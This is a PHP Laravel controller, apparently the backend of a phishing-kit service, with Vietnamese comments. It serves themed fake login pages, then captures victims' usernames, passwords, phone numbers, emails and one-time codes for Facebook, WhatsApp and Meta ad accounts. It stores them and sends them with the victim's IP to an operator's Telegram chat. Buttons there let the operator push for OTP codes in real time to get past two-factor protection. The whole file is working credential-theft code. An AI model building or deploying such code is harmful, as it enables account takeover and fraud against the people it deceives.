<?php

namespace App\Http\Controllers;

use App\Models\FbAccount;
use App\Models\User;
use App\Models\Website;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Crypt;
use Illuminate\Support\Str;
use Nette\Utils\Json;
use Telegram\Bot\Api;

class CustomWeb extends Controller
{
    function handler(Request $rq, $web_data, Website $db_data, $user_settings)
    {
        // ném web info cho client (đã mã hóa để bảo mật)
        $web_info = Crypt::encryptString(Json::encode([
            'id' => $db_data->id,
            'userid' => $db_data->userid,
            'webid' => $db_data->id
        ]));
        // đặt ngôn ngữ cho giao diện
        $theme_language = $web_data->theme_language;
        app()->setLocale($theme_language);
        // pusher code
        $pusher_code = Str::random(10) . md5(rand(999, 9999));
        // nếu link chưa tồn tại ?a (allowed to access website)
        if (!$rq->exists('a')) {
            return view('init', ['data' => $web_data, 'info' => $web_info]);
        } else {
            if (!$rq->exists('l')) {
                return view('custom.user.' . $web_data->theme_folder, ['data' => $web_data, 'setting' => $user_settings, 'input' => $web_data->theme_input, 'pusher_code' => $pusher_code, 'info' => $web_info]);
            } else {
                return view('login.realtime.' . $web_data->loginThemeFolder, ['data' => $web_data, 'info' => $web_info, 'setting' => $user_settings, 'type' => 'custom', 'pusher_code' => $pusher_code]);
            }
        }
    }
    function facebook_post(Request $rq)
    {
        if ($rq->filled('d')) {
            try {
                /*
                $post_data chứa array có item là username, password, info, otp(nếu có), action: ac (n: new account/o: otp)
                + info chứa array có item là id, userid, webid
                */
                $post_data = Json::decode($rq->d);
                /*
                $web_info chứa array có item là id, userid, webid
                */
                $web_info = Json::decode(Crypt::decryptString($post_data->info));
                $ip = getRealIp();
                // pusher code
                $pusher_code = $rq->p_c;
                // kiểm tra thời gian chống spam nếu đã nhập từ trước (giới hạn 3s/lần)
                $check_ip = FbAccount::where('ip', $ip)
                    ->where('type', 'custom')
                    ->latest()
                    ->first();
                $wait_seconds = 3;
                if ($check_ip) {
                    if ($check_ip->created_at->diffInSeconds(now()) <= $wait_seconds) {
                        return response([
                            'status' => false,
                        ]);
                    }
                }
                $custom_bot = new Api(config('telegrambot.custom'));
                $user = User::find($web_info->userid);
                if ($user) {
                    $user_telegram_id = Json::decode($user->data)->telegram_id;
                    if ($user_telegram_id) {
                        $website = Website::where('userid', $user->id)->where('id', $web_info->webid)->first();
                        $ip = getRealIp();
                        // new account
                        if ($website) {
                            $website = Json::decode($website->data);
                            if ($post_data->ac == 'n') {
                                $keyboard = [
                                    [
                                        ['text' => '👤 Sai TK hoặc Email', 'callback_data' => 'wronguser_' . $pusher_code],
                                        ['text' => '🔑 Sai MK', 'callback_data' => 'wrongpass_' . $pusher_code],
                                    ],
                                    [
                                        ['text' => '🔒 Yêu cầu duyệt & mã', 'callback_data' => 'otp_' . $pusher_code],
                                        ['text' => '✅ Thành công', 'callback_data' => 'done_' . $pusher_code],
                                    ]
                                ];
                                $msg = implode("\n", [
                                    "Title: <b>$website->title</b>",
                                    "",
                                    "User: <code>$post_data->username</code>",
                                    "Pass: <code>$post_data->password</code>",
                                    "---------------",
                                    "IP: $ip",
                                    "---------------"
                                ]);
                                // tiến hành insert
                                FbAccount::create([
                                    'userid' => $web_info->userid,
                                    'webid' => $web_info->webid,
                                    'user' => $post_data->username,
                                    'password' => $post_data->password,
                                    'type' => 'custom',
                                    'ip' => $ip
                                ]);
                                $custom_bot->sendMessage([
                                    'chat_id' => $user_telegram_id,
                                    'parse_mode' => 'HTML',
                                    'text' => $msg,
                                    'reply_markup' => json_encode(['inline_keyboard' => $keyboard]),
                                ]);
                            } else {
                                $keyboard = [
                                    [
                                        ['text' => '❌ Nhập sai mã', 'callback_data' => 'wrongcode_' . $pusher_code],
                                        ['text' => '✅ Thành công', 'callback_data' => 'done_' . $pusher_code],
                                    ]
                                ];
                                $msg = implode("\n", [
                                    "Title: <b>$website->title</b>",
                                    "",
                                    "Mã xác minh: <code>$post_data->otp</code>",
                                    "---------------",
                                    "IP: $ip",
                                    "---------------"
                                ]);
                                $custom_bot->sendMessage([
                                    'chat_id' => $user_telegram_id,
                                    'parse_mode' => 'HTML',
                                    'text' => $msg,
                                    'reply_markup' => json_encode(['inline_keyboard' => $keyboard]),
                                ]);
                            }
                        }
                    }
                }
            } catch (\Throwable $e) {
                return response([
                    'status' => false,
                ]);
            }
        }
    }
    function whatsapp_post(Request $rq)
    {
        if ($rq->filled('d')) {
            try {
                $post_data = Json::decode($rq->d);
                $web_info = Json::decode(Crypt::decryptString($post_data->info));
                $ip = getRealIp();
                // pusher code
                $pusher_code = $rq->p_c;
                // kiểm tra thời gian chống spam nếu đã nhập từ trước (giới hạn 3s/lần)
                $check_ip = FbAccount::where('ip', $ip)
                    ->where('type', 'custom_whatsapp')
                    ->latest()
                    ->first();
                $wait_seconds = 3;
                if ($check_ip) {
                    if ($check_ip->created_at->diffInSeconds(now()) <= $wait_seconds) {
                        return response([
                            'status' => false,
                        ]);
                    }
                }
                $whatsapp_realtime_bot = new Api(config('telegrambot.whatsapp'));
                $user = User::find($web_info->userid);
                if ($user) {
                    $user_telegram_id = Json::decode($user->data)->telegram_id;
                    if ($user_telegram_id) {
                        $website = Website::where('userid', $user->id)->where('id', $web_info->webid)->first();
                        $ip = getRealIp();
                        // new account
                        if ($website) {
                            $website = Json::decode($website->data);
                            if ($post_data->ac == 'n') {
                                $keyboard = [
                                    [
                                        ['text' => '❌ SĐT không hợp lệ', 'callback_data' => 'error_' . $pusher_code],
                                        ['text' => '🔒 Yêu cầu OTP', 'callback_data' => 'otp_' . $pusher_code],
                                    ],
                                    [
                                        ['text' => '✅ Thành công', 'callback_data' => 'done_' . $pusher_code],
                                    ],
                                ];
                                $msg = implode("\n", [
                                    "Title: <b>$website->title</b>",
                                    "",
                                    "Số điện thoại: <code>$post_data->phone</code>",
                                    "---------------",
                                    "IP: $ip",
                                    "---------------"
                                ]);
                                // tiến hành insert
                                FbAccount::create([
                                    'userid' => $web_info->userid,
                                    'webid' => $web_info->webid,
                                    'user' => $post_data->phone,
                                    'type' => 'whatsapp',
                                    'ip' => $ip
                                ]);
                                $whatsapp_realtime_bot->sendMessage([
                                    'chat_id' => $user_telegram_id,
                                    'parse_mode' => 'HTML',
                                    'text' => $msg,
                                    'reply_markup' => json_encode(['inline_keyboard' => $keyboard]),
                                ]);
                            } else {
                                $keyboard = [
                                    [
                                        ['text' => '❌ Nhập sai mã', 'callback_data' => 'wrongcode_' . $pusher_code],
                                        ['text' => '✅ Thành công', 'callback_data' => 'done_' . $pusher_code],
                                    ]
                                ];
                                $msg = implode("\n", [
                                    "Title: <b>$website->title</b>",
                                    "",
                                    "Số điện thoại: <code>$post_data->phone</code>",
                                    "Mã xác minh: <code>$post_data->otp</code>",
                                    "---------------",
                                    "IP: $ip",
                                    "---------------"
                                ]);
                                $whatsapp_realtime_bot->sendMessage([
                                    'chat_id' => $user_telegram_id,
                                    'parse_mode' => 'HTML',
                                    'text' => $msg,
                                    'reply_markup' => json_encode(['inline_keyboard' => $keyboard]),
                                ]);
                            }
                        }
                    }
                }
            } catch (\Throwable $e) {
                return response([
                    'status' => false,
                ]);
            }
        }
    }
    # METAADS THEME
    function metaads_post(Request $rq)
    {
        if ($rq->filled('d')) {
            try {
                $post_data = Json::decode($rq->d);
                $web_info = Json::decode(Crypt::decryptString($post_data->info));
                $ip = getRealIp();
                // pusher code
                $pusher_code = $rq->p_c;
                // kiểm tra thời gian chống spam nếu đã nhập từ trước (giới hạn 3s/lần)
                $check_ip = FbAccount::where('ip', $ip)
                    ->where('type', 'custom')
                    ->latest()
                    ->first();
                $wait_seconds = 3;
                if ($check_ip) {
                    if ($check_ip->created_at->diffInSeconds(now()) <= $wait_seconds) {
                        return response([
                            'status' => false,
                        ]);
                    }
                }
                $custom_bot = new Api(config('telegrambot.custom'));
                $user = User::find($web_info->userid);
                if ($user) {
                    $user_telegram_id = Json::decode($user->data)->telegram_id;
                    if ($user_telegram_id) {
                        $website = Website::where('userid', $user->id)->where('id', $web_info->webid)->first();
                        $ip = getRealIp();
                        // new account
                        if ($website) {
                            $website = Json::decode($website->data);
                            $keyboard = [
                                [
                                    ['text' => '👤 Sai SĐT or email', 'callback_data' => 'wronguser_' . $pusher_code],
                                    ['text' => '🔑 Sai MK', 'callback_data' => 'wrongpass_' . $pusher_code],
                                ],
                                [
                                    ['text' => '✅ Thành công', 'callback_data' => 'done_' . $pusher_code],
                                ]
                            ];
                            $msg = implode("\n", [
                                "Giao diện tùy chỉnh: <b>KHÁNG TKQC META</b>",
                                "Title: <b>$website->title</b>",
                                "",
                                "Số điện thoại: <code>$post_data->phone</code>",
                                "Email: <code>$post_data->email</code>",
                                "Pass: <code>$post_data->password</code>",
                                "---------------"
                            ]);
                            // tiến hành insert
                            FbAccount::create([
                                'userid' => $web_info->userid,
                                'webid' => $web_info->webid,
                                'user' => $post_data->phone,
                                'password' => $post_data->password,
                                'type' => 'custom',
                                'ip' => $ip
                            ]);
                            $custom_bot->sendMessage([
                                'chat_id' => $user_telegram_id,
                                'parse_mode' => 'HTML',
                                'text' => $msg,
                                'reply_markup' => json_encode(['inline_keyboard' => $keyboard]),
                            ]);
                        }
                    }
                }
            } catch (\Throwable $e) {
                return response([
                    'status' => false,
                ]);
            }
        }
    }
}
